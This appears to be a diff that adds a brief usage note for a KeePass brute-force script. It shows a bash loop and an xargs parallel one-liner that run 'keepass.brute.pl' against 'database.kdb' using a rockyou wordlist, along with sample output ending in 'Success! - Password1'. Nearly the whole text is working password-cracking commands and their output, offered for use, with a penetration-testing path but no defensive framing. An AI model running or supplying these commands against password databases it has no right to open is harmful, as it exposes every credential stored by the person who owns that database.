@@ -1,0 +1,27 @@
+Very rough ATM - just using bash bash wrapper to cycle through passwords
+
+$ for i in $(cat /pentest/passwords/rockyou-75.txt); do perl keepass.brute.pl database.kdb $i; done
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Couldn't load the file database.kdb:
+Success! - Password1
+
+
+Or multi-threaded w/ xargs
+
+cat /pentest/passwords/rockyou-75.txt | xargs -P 4 -I {} perl keepass.brute.pl database.kdb '{}'
